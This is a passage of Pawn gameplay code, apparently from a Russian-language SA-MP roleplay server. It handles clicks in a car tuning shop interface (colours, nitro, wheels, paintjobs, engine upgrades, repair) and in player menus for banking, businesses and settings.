				ShowPlayerDialog
				(
					playerid, DIALOG_STO_CHANGE_COLOR, DIALOG_STYLE_INPUT,
					"{FFCC00}Смена цвета",
					"{FFFFFF}Введите номер цвета:",
					"Далее", "Отмена"
				);

				SetPVarInt(playerid, "color_type", 1);
			}
			if(clickedid == sto_td_global[3])
			{
				ShowPlayerDialog
				(
					playerid, DIALOG_STO_CHANGE_COLOR, DIALOG_STYLE_INPUT,
					"{FFCC00}Смена цвета",
					"{FFFFFF}Введите номер цвета:",
					"Далее", "Отмена"
				);

				SetPVarInt(playerid, "color_type", 2);
			}
		}

		if(PI[playerid][P_TUNING_TYPE] == 3)
		{
			if(clickedid == sto_td_global[0])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				if(tun_state == 1)
					tun_state = 3;
				else
					tun_state -= 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				new nitro_amount[3] = {2, 5, 10};

				new bizzid = GetPVarInt(playerid,"CTObizzid");
                new till = BizzInfo[bizzid][bTill];

				new price;

				switch(tun_state)
				{
					case 1: price = till*80;
					case 2: price = till*150;
					case 3: price = till*300;
				}

				STRING_GLOBAL[0] = EOS;
				format
				(
					STRING_GLOBAL, sizeof STRING_GLOBAL,
					"ЂA‡Oм м…ЏPO: %d~N~OЂђE–: %d ‡~n~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, nitro_amount[tun_state-1], price
				);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
			if(clickedid == sto_td_global[1])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				if(tun_state == 3)
					tun_state = 1;
				else
					tun_state += 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				new nitro_amount[3] = {2, 5, 10};

				new bizzid = GetPVarInt(playerid,"CTObizzid");
                new till = BizzInfo[bizzid][bTill];

				new price;

				switch(tun_state)
				{
					case 1: price = till*80;
					case 2: price = till*150;
					case 3: price = till*300;
				}

				STRING_GLOBAL[0] = EOS;
				format
				(
					STRING_GLOBAL, sizeof STRING_GLOBAL,
					"ЂA‡Oм м…ЏPO: %d~N~OЂђE–: %d ‡~n~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, nitro_amount[tun_state-1], price
				);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
		}

		if(PI[playerid][P_TUNING_TYPE] == 4)
		{
			if(clickedid == sto_td_global[0])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				new bizzid = GetPVarInt(playerid,"CTObizzid");
                new till = BizzInfo[bizzid][bTill];

				if(tun_state == 1)
					tun_state = 10;
				else
					tun_state -= 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				AddVehicleComponent(GetPlayerVehicleID(playerid), g_tuning_disks[tun_state-1][D_COMPONENT]);
				printf("tun_state: %d componentid %d", tun_state, g_tuning_disks[tun_state-1][D_COMPONENT]);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "ѓ…CK…: %d~N~мA€BAм…E: %s~n~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, g_tuning_disks[tun_state-1][D_NAME], till*g_tuning_disks[tun_state-1][D_PRICE]);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
			if(clickedid == sto_td_global[1])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				new bizzid = GetPVarInt(playerid,"CTObizzid");
                new till = BizzInfo[bizzid][bTill];

				if(tun_state == 10)
					tun_state = 1;
				else
					tun_state += 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				AddVehicleComponent(GetPlayerVehicleID(playerid), g_tuning_disks[tun_state-1][D_COMPONENT]);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "ѓ…CK…: %d~N~мA€BAм…E: %s~n~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, g_tuning_disks[tun_state-1][D_NAME], till*g_tuning_disks[tun_state-1][D_PRICE]);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
		}

		if(PI[playerid][P_TUNING_TYPE] == 5)
		{
			if(clickedid == sto_td_global[0])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				new bizzid = GetPVarInt(playerid,"CTObizzid");
                new till = BizzInfo[bizzid][bTill];

				new price_paintjob[3] = {30, 35, 40};

				if(tun_state == 1)
					tun_state = 3;
				else
					tun_state -= 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), tun_state-1);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "B…м…‡‘: %d~N~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, till*price_paintjob[tun_state-1]);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
			if(clickedid == sto_td_global[1])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				new bizzid = GetPVarInt(playerid,"CTObizzid");
                new till = BizzInfo[bizzid][bTill];

				new price_paintjob[3] = {30, 35, 40};

				if(tun_state == 3)
					tun_state = 1;
				else
					tun_state += 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), tun_state-1);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "B…м…‡‘: %d~N~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, till*price_paintjob[tun_state-1]);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
		}
		if(PI[playerid][P_TUNING_TYPE] == 7)
		{
			if(clickedid == sto_td_global[0])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				if(tun_state == 1)
					tun_state = 3;
				else
					tun_state -= 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "ѓB…‚AЏE‡’: %s~N~ЊP…ЂABKA K –AKC. CKOP.: %d K–/Ќ~n~CЏO…–OCЏ’: %d –‡м. PYЂ‡E†", g_tuning_engine[tun_state-1][E_NAME], g_tuning_engine[tun_state-1][E_MAX_SPEED], g_tuning_engine[tun_state-1][E_PRICE]);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
			if(clickedid == sto_td_global[1])
			{
				new tun_state = PI[playerid][P_TUNING_STATE];

				if(tun_state == 3)
					tun_state = 1;
				else
					tun_state += 1;

				PI[playerid][P_TUNING_STATE] = tun_state;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "ѓB…‚AЏE‡’: %s~N~ЊP…ЂABKA K –AKC. CKOP.: %d K–/Ќ~n~CЏO…–OCЏ’: %d –‡м. PYЂ‡E†", g_tuning_engine[tun_state-1][E_NAME], g_tuning_engine[tun_state-1][E_MAX_SPEED], g_tuning_engine[tun_state-1][E_PRICE]);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
		}

		if(clickedid == sto_td_global[25])
		{
			switch(PI[playerid][P_TUNING_TYPE])
			{
				case 1:
				{
					new i = GetPVarInt(playerid,"CTObizzid");
					new till = BizzInfo[i][bTill];
					new vehicleid = GetPlayerVehicleID(playerid);
					if(GetMoney(playerid) < till*5) return SendMess(playerid, MSG_NOT_MONEY);
					GiveMoney(playerid, -till*5, "СТО");
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += till*5;
						BizzInfo[i][bProduct] -= 5;
						BizzPay[i] += till*5;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					g_vehicle[vehicleid][veh_color][0] = PI[playerid][P_COLOR][0];
					g_vehicle[vehicleid][veh_color][1] = PI[playerid][P_COLOR][1];
					ChangeVehicleColor(vehicleid, PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1]);

					STRING_GLOBAL[0] = EOS;

					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET color_1=%d, color_2=%d WHERE id=%d", PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], GetVehicleData(vehicleid, veh_sql_id));
					mysql_query(dbHandle, STRING_GLOBAL);

					SendClientMessage(playerid, C_OSNOV, "Вы успешно перекрасили свой транспорт");
				}
				case 2:
				{
					if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_HYDRAULICS) != 1087)
					{
						new i = GetPVarInt(playerid,"CTObizzid");
						new till = BizzInfo[i][bTill];

						if(GetMoney(playerid) < till*100) return SendMess(playerid, MSG_NOT_MONEY);
						GiveMoney(playerid, -till*100);
						if(BizzInfo[i][bProduct] > 0)
						{
							BizzInfo[i][bMoney] += till*100;
							BizzInfo[i][bProduct] -= 100;
							BizzPay[i] += till*100;
							MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
							MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
						}
						SendClientMessage(playerid, C_OSNOV, "Вы успешно установили гидравлику на свой транспорт");
						AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);
					}
					else
					{
						SendClientMessage(playerid, C_OSNOV, "Вы успешно удалили гидравлику со своего транспорта");
						RemoveVehicleComponent(GetPlayerVehicleID(playerid), 1087);
					}
					SaveVehicleTuning(playerid);
				}
				case 3:
				{
					new tun_state = PI[playerid][P_TUNING_STATE]-1;

					new i = GetPVarInt(playerid,"CTObizzid");
					new till = BizzInfo[i][bTill];

					new nitro_names[3][10] = {"Nitro x2", "Nitro x5", "Nitro x10"};
					new nitro_component[3] = {1009, 1008, 1010};
					new nitro_price[3] = {80000, 100000, 150000};

					if(GetMoney(playerid) < till*nitro_price[tun_state]) return SendMess(playerid, MSG_NOT_MONEY);
					GiveMoney(playerid, -till*nitro_price[tun_state]);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += till*80;
						BizzInfo[i][bProduct] -= 80;
						BizzPay[i] += till*80;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили на свой транспорт %s за %d рублей", nitro_names[tun_state], till*nitro_price[tun_state]);
					SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

					AddVehicleComponent(GetPlayerVehicleID(playerid), nitro_component[tun_state]);
					SaveVehicleTuning(playerid);

					PI[playerid][P_TUNING_STATE] = 1;
				}
				case 4:
				{
					new tun_state = PI[playerid][P_TUNING_STATE];

					new i = GetPVarInt(playerid,"CTObizzid");
					new till = BizzInfo[i][bTill];

					if(GetMoney(playerid) < till*g_tuning_disks[tun_state-1][D_PRICE]) return SendMess(playerid, MSG_NOT_MONEY);
					GiveMoney(playerid, -till*g_tuning_disks[tun_state-1][D_PRICE]);

					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += till*g_tuning_disks[tun_state-1][D_PRICE];
						BizzInfo[i][bProduct] -= g_tuning_disks[tun_state-1][D_PRODUCT];
						BizzPay[i] += till*g_tuning_disks[tun_state-1][D_PRICE];
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили диски %s на свой транспорт за %d рублей", g_tuning_disks[tun_state-1][D_NAME], till*g_tuning_disks[tun_state-1][D_PRICE]);
					SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

					SaveVehicleTuning(playerid);

					PI[playerid][P_TUNING_STATE] = 1;
				}
				case 5:
				{
					new tun_state = PI[playerid][P_TUNING_STATE];
					new vehicleid = GetPlayerVehicleID(playerid);
					new i = GetPVarInt(playerid,"CTObizzid");
					new till = BizzInfo[i][bTill];

					new price_paintjob[3] = {30000, 35000, 40000};

					if(GetMoney(playerid) < till*price_paintjob[tun_state-1]) return SendMess(playerid, MSG_NOT_MONEY);
					GiveMoney(playerid, -till*price_paintjob[tun_state-1]);

					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += till*price_paintjob[tun_state-1];
						BizzInfo[i][bProduct] -= price_paintjob[tun_state-1];
						BizzPay[i] += till*price_paintjob[tun_state-1];
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили покрасочную работу %d на свой транспорт за %d рублей", tun_state, till*price_paintjob[tun_state-1]);
					SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

					SetVehicleData(vehicleid, veh_paintjob, tun_state-1);

					SaveVehicleTuning(playerid);

					PI[playerid][P_TUNING_STATE] = 1;
				}
				case 6:
				{
					new i = GetPVarInt(playerid,"CTObizzid");
					if(GetMoney(playerid) < 1000) return SendMess(playerid, MSG_NOT_MONEY);
					GiveMoney(playerid, -1000);
					new vehicleid = GetPlayerVehicleID(playerid);
					g_vehicle[vehicleid][veh_wear] += 1.0; // 0.1 процент
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += 1000;
						BizzInfo[i][bProduct] -= 100;
						BizzPay[i] += 1000;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
						RepairVehicle(GetPlayerVehicleID(playerid));
					}
					RepairVehicle(GetPlayerVehicleID(playerid));
					SetVehicleHealth(GetPlayerVehicleID(playerid), 1000.0);
					SendClientMessage(playerid, C_OSNOV, "Вы успешно отремонтировали свой транспорт за 1000 рублей");
				}
				case 7:
				{
					new tun_state = PI[playerid][P_TUNING_STATE];
					new vehicleid = GetPlayerVehicleID(playerid);

					if(g_vehicle[vehicleid][veh_improve] == tun_state)
						return SendClientMessage(playerid, C_RED, "У Вас уже куплено это улучшение");

					new i = GetPVarInt(playerid,"CTObizzid");
					if(GetMoney(playerid) < g_tuning_engine[tun_state-1][E_PRICE]*1000000) return SendMess(playerid, MSG_NOT_MONEY);
					GiveMoney(playerid, -g_tuning_engine[tun_state-1][E_PRICE]*1000000);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += g_tuning_engine[tun_state-1][E_PRICE]*1000000;
						BizzInfo[i][bProduct] -= 500;
						BizzPay[i] += g_tuning_engine[tun_state-1][E_PRICE]*1000000;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}

					PI[playerid][P_TYPE_SPEED] = 0;

					SetVehicleData(vehicleid, veh_improve, tun_state);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET engine=%d WHERE id=%d", tun_state, g_vehicle[vehicleid][veh_sql_id]);
					mysql_query(dbHandle, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно установили двигатель %s на свой транспорт за %d рублей", g_tuning_engine[tun_state-1][E_NAME], g_tuning_engine[tun_state-1][E_PRICE]*1000000);
					SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
				}
			}
		}
	}
	if(ClothesRound[playerid] == 1)
	{
		if(clickedid == select_skin[3])
		{
			if(PI[playerid][pSex] == 1)
			{
				if(SelectCharPlace[playerid] == sizeof(JoinRegM)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]++;
				SetPlayerSkin(playerid, JoinRegM[SelectCharPlace[playerid]]);
				ChosenSkin[playerid] = JoinRegM[SelectCharPlace[playerid]];
			}
			else
			{
			    if(SelectCharPlace[playerid] == sizeof(JoinRegF)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]++;
				SetPlayerSkin(playerid, JoinRegF[SelectCharPlace[playerid]]);
				ChosenSkin[playerid] = JoinRegF[SelectCharPlace[playerid]];
			}
		}
		else if(clickedid == select_skin[3])
		{
			if(PI[playerid][pSex] == 1)
			{
			    if(SelectCharPlace[playerid] == 0) SelectCharPlace[playerid] = sizeof(JoinRegM)-1;
				else SelectCharPlace[playerid]--;
				SetPlayerSkin(playerid, JoinRegM[SelectCharPlace[playerid]]);
				ChosenSkin[playerid] = JoinRegM[SelectCharPlace[playerid]];
			}
			else
			{
			    if(SelectCharPlace[playerid] == 0) SelectCharPlace[playerid] = sizeof(JoinRegF)-1;
				else SelectCharPlace[playerid]--;
				SetPlayerSkin(playerid, JoinRegF[SelectCharPlace[playerid]]);
				ChosenSkin[playerid] = JoinRegF[SelectCharPlace[playerid]];
			}
		}
	}
	else if(clickedid == TDEditor_LICGLOBAL[5])
	{
		for(new i; i < sizeof TDEditor_LICGLOBAL; i ++) TextDrawHideForPlayer(playerid, TDEditor_LICGLOBAL[i]);
		PlayerTextDrawHide(playerid, TDEditor_LICPLAYER[playerid]);

		CancelSelectTextDraw(playerid);

		DeletePVar(playerid, "show_lic");
	}
	else if(clickedid == TDEditor_PROMO[6])
	{
		for(new i; i < sizeof TDEditor_PROMO; i ++) TextDrawHideForPlayer(playerid, TDEditor_PROMO[i]);

		CancelSelectTextDraw(playerid);
	}
   	else if(clickedid == KolvDialog[1])//2
	{
		switch(PlayersMenu[playerid])
		{
			case 1: callcmd::cmd(playerid);
			case 2:
			{
			    new bizzid = GetPVarInt(playerid,"CTObizzid");
			    new till = BizzInfo[bizzid][bTill];
				if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),CARMODTYPE_HYDRAULICS) != 1087)
				{
				    STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, 128,"{FFFFFF}Стоимость установки: %dр\nВы уверены, что хотите купить и поставить гидравлику?",till*100);
					ShowPlayerDialog(playerid,D_CTO+3,DIALOG_STYLE_MSGBOX,"Установка гидравлики", STRING_GLOBAL,"Да","Назад");
				}
			}
			case 3:
			{
				new till = BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bTill]*4;
 				if(GetMoney(playerid) < till) return SendMess(playerid, MSG_NOT_MONEY);
  				if(CheckMaxVes(playerid,49,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
				GiveMoney(playerid, -till);
		   	    if(BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] > 0)
		   	    {
	    			BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney] += till;
				    BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] -= 10;
				    BizzPay[GetPVarInt(playerid, "FuelBizzID")] += till;
				    MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "money", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney]);
				    MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "product", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct]);
    			}
				PlayerItem1[playerid][newslot]=49;
		   		PlayerItem2[playerid][newslot]+=1;
		   		STRING_GLOBAL[0] = EOS;
			    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы купили канистру за %iр!", till);
				SendClientMessage(playerid, COLOR_YELLOW, STRING_GLOBAL);
	          	DeletePVar(playerid,"FuelBizzID");
	      		SaveItem(playerid,newslot);
				PlayerMenuExit(playerid);
			}
			case 6..7:
			{
			    ShowPlayerDialog(playerid, D_ATM+12, 1, "Пополнение",
				"{FFFFFF}Введите количество денег\n\
				на которое хотите пополнить банковский счёт", "Принять", "Назад");
			}
			case 9:
			{
				STRING_GLOBAL[0] = EOS;
   				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE member = '%i' AND online = '0'", PI[playerid][pMember]);
                mysql_tquery(dbHandle, STRING_GLOBAL, "OfflineMembersOnFraction", "i", playerid);
			}
		}
   	}

   	else if(clickedid == KolvDialog[2])//3
	{
		switch(PlayersMenu[playerid])
		{
			case 1: callcmd::report(playerid);
			case 2:
            {
                new bizzid = GetPVarInt(playerid,"CTObizzid");
                new till = BizzInfo[bizzid][bTill];

                STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL,128,"1. Nitro x2\t\t[%dр]\n2. Nitro x5\t\t[%dр]\n3. Nitro x10\t\t[%dр]",till*80,till*150,till*300);
				ShowPlayerDialog(playerid,D_CTO+5,DIALOG_STYLE_LIST,"Закись азота",STRING_GLOBAL,"Купить","Назад");
			}
			case 3:
			{
		 		new till = BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bTill]*5;
     			if(CheckMaxVes(playerid,48,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
     		 	if(GetMoney(playerid) < till) return SendMess(playerid, MSG_NOT_MONEY);
                GiveMoney(playerid, -till);
                if(BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] > 0)
  		 		{
		 			BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney] += till;
   		 			BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] -= 10;
  			 		BizzPay[GetPVarInt(playerid, "FuelBizzID")] += till;
				 	MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "money", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney]);
				 	MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "product", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct]);
		 		}
     			PlayerItem1[playerid][newslot]=48;
	 			PlayerItem2[playerid][newslot]+=1;

                STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы купили набор инструментов за %iр!", till);
				SendClientMessage(playerid, COLOR_YELLOW, STRING_GLOBAL);

        		DeletePVar(playerid,"FuelBizzID");
     			SaveItem(playerid,newslot);
     			PlayerMenuExit(playerid);
			}
			case 6..7:
			{
			    ShowPlayerDialog(playerid, D_ATM+11, 1, "Снять со счета",
				"{FFFFFF}Введите количество денег\n\
				которое хотите снять с банковского счёта", "Принять", "Назад");
			}
			case 9: ShowPlayerDialog(playerid, D_LPANEL, DIALOG_STYLE_INPUT, "Уволить игрока",
			"{FFFFFF}Введите ник игрока, которого Вы хотите уволить:", "Далее", "Отмена");
		}
   	}
   	else if(clickedid == KolvDialog[3])//4
	{
		switch(PlayersMenu[playerid])
		{
			case 1: callcmd::ask(playerid);
			case 2:
			{
			    new bizzid = GetPVarInt(playerid,"CTObizzid");
			    new till = BizzInfo[bizzid][bTill];

			    STRING_GLOBAL[0] = EOS;
			    format(STRING_GLOBAL, 350,"1. Shadow\t\t[%dр]\n2. Mega\t\t\t[%dр]\n3. Wires\t\t[%dр]\n4. Classic\t\t[%dр]\n5. Twist\t\t\t[%dр]\n6. Cutter\t\t[%dр]\n7. Grove\t\t[%dр]\n8. Atomic\t\t[%dр]\n9. Dollar\t\t[%dр]\n10. Switch\t\t[%dр]",till*60,till*79,till*53,till*73,till*93,till*80,till*42,till*100,till*200,till*300);
			    ShowPlayerDialog(playerid,D_CTO+6,DIALOG_STYLE_LIST,"Смена дисков", STRING_GLOBAL,"Смотреть","Назад");
			}
			case 6..7:
			{
				if(GetPlayerHouse(playerid) > 0)
				{
					new h = GetPVarInt(playerid, "PlayerHouse");
					return ShowPlayerDialogPayHouse(playerid, h);
				}

				return SendClientMessage(playerid, COLOR_GREY, "У Вас нет дома/квартиры!");
			}
		}
   	}
   	else if(clickedid == KolvDialog[4])//5
	{
		switch(PlayersMenu[playerid])
		{
			case 1:
			{
			    STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s\n%s\n%s\n%s\n%s\n%s\n%s",
				(Settings[playerid][0] != 0) ? ("{0099FF}1. {FFFFFF}Отображать чат организации\t\t\t| {FF0000}-") : ("{0099FF}1. {FFFFFF}Отображать чат организации\t\t\t| {63BD4E}+"),
				(Settings[playerid][7] != 0) ? ("{0099FF}2. {FFFFFF}Отображать ники игроков\t\t\t\t| {FF0000}-") : ("{0099FF}2. {FFFFFF}Отображать ники игроков\t\t\t\t| {63BD4E}+"),
				(Settings[playerid][1] != 0) ? ("{0099FF}3. {FFFFFF}Отображать действия администрации\t\t| {FF0000}-") : ("{0099FF}3. {FFFFFF}Отображать действия администрации\t\t| {63BD4E}+"),
				(Settings[playerid][2] != 0) ? ("{0099FF}4. {FFFFFF}Отображать ID игроков в чате\t\t\t| {FF0000}-") : ("{0099FF}4. {FFFFFF}Отображать ID игроков в чате\t\t\t| {63BD4E}+"),
				(Settings[playerid][3] != 0) ? ("{0099FF}5. {FFFFFF}Отображать чемодан в руке игрока\t\t\t| {FF0000}-") : ("{0099FF}5. {FFFFFF}Отображать чемодан в руке игрока\t\t\t| {63BD4E}+"),
				(Settings[playerid][5] != 1) ? ("{0099FF}6. {FFFFFF}Отображать 3D номера на транспорте\t\t| {FF0000}-") : ("{0099FF}7. {FFFFFF}Отображать 3D номера на транспорте\t\t| {63BD4E}+"));
				ShowPlayerDialog(playerid, D_JOB+173, DIALOG_STYLE_LIST, "Настройки персонажа", STRING_GLOBAL, "Выбрать", "Назад");
			}
			case 2:
			{
			    new bizzid = GetPVarInt(playerid,"CTObizzid");
			    new till = BizzInfo[bizzid][bTill];

			    STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL,150,"1. Покрасочная работа №1\t\t[%dр]\n2. Покрасочная работа №2\t\t[%dр]\n3. Покрасочная работа №3\t\t[%dр]",till*30,till*35,till*40);
				ShowPlayerDialog(playerid,D_CTO+7,DIALOG_STYLE_LIST,"Покрасочные работы",STRING_GLOBAL,"Смотреть","Назад");
			}
			case 6..7:
			{
				if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFFFFF}Введите сумму пополнения\nТекущий счет бизнеса: %dр", BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bMoney]);
				ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение счета бизнеса", STRING_GLOBAL, "Принять", "Назад");
			}
		}
   	}
   	else if(clickedid == KolvDialog[6])//слот 7
	{
		switch(PlayersMenu[playerid])
		{
			case 1:
			{
			    STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s\n%s\n%s\n%s\n{FFFFFF}Помощь",
				(PI[playerid][pImprove][0] != 1) ? ("{0099FF}1. {FFFFFF}Выносливость\t| {F04245}Не имеется (2 уровень и 50.000р)") : ("{0099FF}1. {FFFFFF}Выносливость\t| {63BD4E}Куплено"),
				(PI[playerid][pImprove][1] != 1) ? ("{0099FF}2. {FFFFFF}Решительность\t| {F04245}Не имеется (3 уровень и 75.000р)") : ("{0099FF}2. {FFFFFF}Решительность\t| {63BD4E}Куплено (/leave)"),
				(PI[playerid][pImprove][3] != 1) ? ("{0099FF}3. {FFFFFF}Мастер вождения\t| {F04245}Не имеется (10 уровень и 125.000р)") : ("{0099FF}3. {FFFFFF}Мастер вождения\t| {63BD4E}Куплено"));
				ShowPlayerDialog(playerid, D_JOB+177, DIALOG_STYLE_LIST, "Улучшения персонажа", STRING_GLOBAL, "Выбрать", "Назад");
			}
			case 6..7:
			{
   				STRING_GLOBAL[0] = EOS;
			    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFFFFF}Введите количество денег, которые хотите пожертвовать на благотворительность\n\nВы пожертвовали: {63BD4E}%dр", PI[playerid][pCharity]);
			    ShowPlayerDialog(playerid, D_ATM+4, 1, "Благотворительность", STRING_GLOBAL, "Принять", "Назад");
			}
		}
   	}
   	else if(clickedid == KolvDialog[7])//слот 8
	{
		switch(PlayersMenu[playerid])
		{
			case 1: ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена нонРП ника",
			"{FFFFFF}Введите будущий ник\n\n\
	   		{F04245}Возможно сменить только если у Вас нонРП ник!", "Принять", "Назад");
	   		case 7:
			{
   				if(!TransferReset[playerid])
				{
					if(PI[playerid][pLevel] >= 5) ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "{FFFFFF}Введите ID или имя игрока и количество денег через запятую\n\nПример: Ivan_Ivanov, 10000", "Принять", "Назад");
					else SendClientMessage(playerid,COLOR_GREY,"Переводить деньги можно только с 5-го уровня");
				}
				else
				{
    				SendClientMessage(playerid, COLOR_GREY, "Переводить деньги можно только раз в минуту.");
				}
			}
		}
   	}
   	else if(clickedid == KolvDialog[8])//слот 9
	{
		switch(PlayersMenu[playerid])
		{
			case 1:
			{
				callcmd::donate(playerid);
			}
			case 7:
			{
				new b = GetPVarInt(playerid, "PlayerBizz");
				if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFFFFF}Введите сумму вывода денег с бизнеса\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
				ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод счета с бизнеса", STRING_GLOBAL, "Принять", "Назад");
			}
		}
   	}
